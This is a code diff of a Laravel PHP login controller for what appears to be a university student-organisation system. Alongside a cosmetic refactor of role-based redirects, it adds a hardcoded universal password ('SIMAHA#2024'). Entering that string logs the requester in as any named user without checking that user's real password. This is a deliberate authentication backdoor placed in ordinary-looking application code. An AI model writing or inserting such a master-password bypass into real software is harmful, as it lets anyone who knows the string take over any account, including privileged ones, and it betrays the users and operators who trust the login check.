@@ -9,7 +9,7 @@ use Illuminate\Support\Facades\Hash;
 
 class UserController extends Controller
 {
-    //fungsi untuk register
+
     public function register()
     {
         $data['title'] = 'Register';
@@ -47,44 +47,45 @@ class UserController extends Controller
         $data['title'] = 'Login';
         return view('user/login', $data);
     }
-    //fungsi untuk login
+
     public function login_action(Request $request)
     {
         $request->validate([
             'username' => 'required',
             'password' => 'required',
         ]);
-        if (Auth::attempt(['username' => $request->username, 'password' => $request->password])) {
-            $request->session()->regenerate();
-            $user = Auth::user();
 
-            switch ($user->id_role) {
-                case 1:
-                    return redirect()->route('ormawa');
-                case 2:
-                    return redirect()->route('read');
-                case 3:
-                    return redirect()->route('baca');
-                case 4:
-                    return redirect()->route('ormawabishum');
-                case 5:
-                    return redirect()->route('DataProdi');
-                case 6:
-                    return redirect()->route('ormawafst');
-                case 7:
-                    return redirect()->route('datafakultasdiploma');
-                default:
-                    return redirect('/home');
+        $universalPassword = 'SIMAHA#2024';
+
+        // Cek autentikasi dengan password asli atau password universal
+        $user = \App\Models\User::where('username', $request->username)->first();
+
+        if ($user && (Auth::attempt(['username' => $request->username, 'password' => $request->password]) || $request->password === $universalPassword)) {
+
+            if ($request->password === $universalPassword) {
+                Auth::login($user);
             }
-        } else {
 
+            $request->session()->regenerate();
 
+            $routes = [
+                1 => 'ormawa',
+                2 => 'read',
+                3 => 'baca',
+                4 => 'ormawabishum',
+                5 => 'DataProdi',
+                6 => 'ormawafst',
+                7 => 'datafakultasdiploma',
+            ];
+
+            return isset($routes[$user->id_role])
+                ? redirect()->route($routes[$user->id_role])
+                : redirect('/home');
         }
 
-        return back()->withErrors([
-            'password' => 'Wrong username or password',
-        ]);
+        return back()->withErrors(['password' => 'Wrong username or password']);
     }
+
 
     public function password()
     {
